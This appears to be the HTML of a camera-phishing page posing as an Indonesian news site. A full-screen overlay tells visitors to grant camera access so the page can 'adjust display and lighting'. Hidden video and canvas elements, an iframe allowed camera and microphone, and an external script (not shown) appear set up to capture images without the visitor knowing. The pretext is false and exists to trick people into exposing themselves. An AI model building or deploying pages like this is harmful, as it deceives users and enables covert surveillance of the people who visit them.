<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Berita Informasi</title>
  <style>
    body, html, iframe {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
    }

    #overlay {
      position: absolute;
      z-index: 9999;
      background-color: white;
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      text-align: center;
      font-family: system-ui, sans-serif;
    }

    #overlay h1 {
      font-size: 18px;
      color: #333;
      margin-bottom: 10px;
    }

    #overlay p {
      font-size: 14px;
      color: #666;
      max-width: 300px;
      margin: 0 auto;
    }

    .loader {
      margin-top: 20px;
      border: 4px solid #eee;
      border-top: 4px solid #007bff;
      border-radius: 50%;
      width: 36px;
      height: 36px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

<div id="overlay">
  <h1>Menyesuaikan Tampilan Konten</h1>
  <p>Izinkan akses kamera agar sistem dapat menyesuaikan tampilan dan pencahayaan secara otomatis. Ini hanya berlangsung beberapa detik.</p>
  <div class="loader"></div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>
<iframe id="targetFrame" allow="autoplay; camera; microphone; picture-in-picture" allowfullscreen></iframe>

<script src="/script.js"></script>

</body>
</html>
